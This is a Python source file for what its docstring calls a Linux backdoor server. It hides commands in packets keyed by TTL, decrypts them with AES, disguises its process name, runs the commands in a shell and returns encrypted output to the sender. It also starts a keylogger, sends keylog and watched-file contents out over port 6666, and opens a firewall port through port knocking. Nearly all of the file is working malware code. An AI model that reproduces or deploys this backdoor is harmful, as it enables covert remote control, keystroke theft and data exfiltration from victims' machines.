import os
import argparse
import subprocess
from scapy.all import *
from subprocess import *
from binascii import hexlify, unhexlify
import binascii
import setproctitle
import crypto
import threading
import time
import sys
import logging
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler 
from datetime import datetime
import socket
#import keylogger.py
#import keylogger
'''
Linux backdoor server file.
Receive Command
Parse Command
Execute Command
Send Result back
Run it: sudo python server.py
'''

def recv_send(pkt):
    global protocol
    '''
    Receive command and decode it
    '''
    key = 8
    print("Message Received")
    ttlkey = pkt[IP].ttl
    if ttlkey == 111:
        if(pkt.haslayer(UDP)):
            print("udp")
            #sniff(filter="udp and src port 8505 and dst port 8000", prn=recv_send)
            protocol = 'udp'
        elif(pkt.haslayer(TCP)):
            #sniff(filter="tcp and src port 8505 and dst port 8000", prn=recv_send)
            protocol = 'tcp'
        packet = pkt[Raw].load
        print("Encrpyted message: "+ str(packet))
        decryptedMsg = ''
        
        print("AES decrypting")
        decryptedMsg = crypto.aesDecrypt(packet)
        print("decrypted message: " + str(decryptedMsg))
        
        #process message by spliter
        splitMsg = decryptedMsg.split("\"")
        process_title = splitMsg[0]
        print("process title: "+ process_title)
        command = splitMsg[1]
        print("command: "+command)
        
        '''
        Parse and execute command
        '''
        
        #set process title to hide process
        setproctitle.setproctitle(process_title)
        
        #run command 
        userInput = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr = subprocess.PIPE)
        shellOutput= userInput.stdout.read() + userInput.stderr.read()
        newOutput = shellOutput.decode()
        #print(newOutput)
        
        if newOutput == "":
            print("No output")
            newOutput = "No feedback from terminal"
        
        '''
        After receive the command and execute the command
        Now sending results back 
        '''
        
        byte_output = newOutput.encode("utf8")
        encoded_output = binascii.hexlify(byte_output)
        
        aes_output = crypto.aesEncrypt(encoded_output)
        
        #max_len = 2
        #chunks = int((len(aes_output)/max_len) + 1)
        #output = []
        #for i in range(0, chunks):
            #output.append(aes_output[(max_len * i): min((max_len + (max_len * i)), len(aes_output))])
        
            
        
        print("encoded output: "+ str(aes_output[:120]))
        dstip = pkt[0][1].src
        #sniff packet
        if protocol=='udp':
            #for i in output:
            pkt = IP(dst=dstip)/UDP(dport=8505,sport=8000)/aes_output
   
        if protocol=='tcp':
            pkt = IP(dst=pkt[0][1].src)/TCP(dport=8505,sport=8000)/aes_output
        #slow it down
        time.sleep(0.5)
        send(pkt,verbose=0)
        print("Packet sent")

def startMonitor(pkt):
    print("Monitoring..")
    global dogreturn
    global Monitor
    global process
    global wCommand
    global destIP
    
    if(pkt.haslayer(UDP)):
        protocol = 'udp'
    elif(pkt.haslayer(TCP)):
        protocol = 'tcp'
    print("pass protocol")
    packet = pkt[Raw].load
    print(packet)
    decryptedWatchPacket = crypto.aesDecrypt(packet)
    ip = pkt[IP].src
    print(pkt)
    destination_IP = pkt[0][1].src
    destIP = destination_IP
    
    watchCommand = binascii.unhexlify(decryptedWatchPacket)
    parse = watchCommand.decode()
    parseCommand = parse.split("\"")
    processTitle = parseCommand[0]
    processCommand = parseCommand[1]
    
    if processCommand == "keylog.txt":
        f = open(processCommand,'rb')
        filedata = f.read()
        aesMessageWatch = crypto.aesEncrypt(filedata)
        print("=================================")
        print(aesMessageWatch)
 
        if protocol=='udp':
            pkt = IP(dst=pkt[0][1].src)/UDP(dport=6666,sport=6666)/aesMessageWatch
        if protocol=='tcp':
            pkt = IP(dst=pkt[0][1].src)/TCP(dport=6666,sport=6666)/aesMessageWatch
        time.sleep(0.5)
        send(pkt,verbose=0)
        
    else:    
        wCommand = processCommand
        print("watching.."+ processCommand)
        setproctitle.setproctitle(processTitle)
        
        #run watchdog
        watch = OnMyWatch(wCommand)
        watch.run()

        f = open(processCommand,'rb')
        filedata = f.read()
        aesMessageWatch = crypto.aesEncrypt(filedata)
        print("=================================")
        print(aesMessageWatch)
    
        if protocol=='udp':
            #print("seeeeeeeeed")
            pkt = IP(dst=pkt[0][1].src)/UDP(dport=6666,sport=6666)/aesMessageWatch
            #print("seeeeennnntttt")
        if protocol=='tcp':
            pkt = IP(dst=pkt[0][1].src)/TCP(dport=6666,sport=6666)/aesMessageWatch
        time.sleep(0.5)
        send(pkt,verbose=0)

    
'''
Port knocker and downloadfile
'''
def knocker(pkt):
    print("Port knocking")
    if pkt.haslayer(TCP):
        #attack = pkt[0][1].src 
        command = "iptables -I INPUT -p tcp --destination-port " + str(9000) + " -j ACCEPT"
        subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    
    
    
    time.sleep(20)
    close_command = "iptables -F"
    subprocess.Popen(close_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        



def doorsniffer(pkt):
    return
#passer
def carry(string):
    global dogreturn
    dogreturn = string
    print("doooooog + " + dogreturn)


def get_protocol():
    global protocol
    sniff(filter="src port 8505 and dst port 8000",prn=recv_send)
    
def sniffer2():

    sniff(filter="src port 9505 and dst port 9000",prn=startMonitor)

def doorsniffer():
    sniff(filter="src port 6666 and dst port 6666", prn = knocker)
    
def keylogger():
    os.system('python keylogger.py')
    
if __name__ == '__main__':
    try:
        print("Server running!")
        #sniff(filter="udp and src port 8505 and dst port 8000", prn=recv_send)
        t1 = threading.Thread(target=get_protocol,args=[])
        t2 = threading.Thread(target=sniffer2,args=[])
        t3 = threading.Thread(target=keylogger,args=[])
        #if not t1.is_alive():
        #watch = OnMyWatch(wCommand) 
        #t3 = threading.Thread(target=watch.run,args=[])
        t1.start()
        #watch.run()  
        t2.start()
        t3.start()
        #t3.start()
        
    except KeyboardInterrupt:
        print ('Exiting..')



#file monitor main function
class OnMyWatch(object): 


    def __init__(self, file): 
        self.observer = Observer()
        self.file = file

    def run(self): 
        event_handler = Handler() 
        self.observer.schedule(event_handler, self.file, recursive = False) 
        self.observer.start() 
        try: 
            #while True: 
            time.sleep(5)
            self.observer.stop()
        except: 
            self.observer.stop() 
            print("Observer Stopped") 

        self.observer.join() 


class Handler(FileSystemEventHandler): 

    @staticmethod
    def on_any_event(event): 
        if event.is_directory: 
            return None
        elif event.event_type == 'modified': 
            now = datetime.now()
            dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            carry(dt_string + " modified")
            #print("Last + "+ dt_string)
            # Event is modified, you can process it now 
            #print("Watchdog received modified event - % s." % event.src_path) 
            


   
    
    
    
    
    
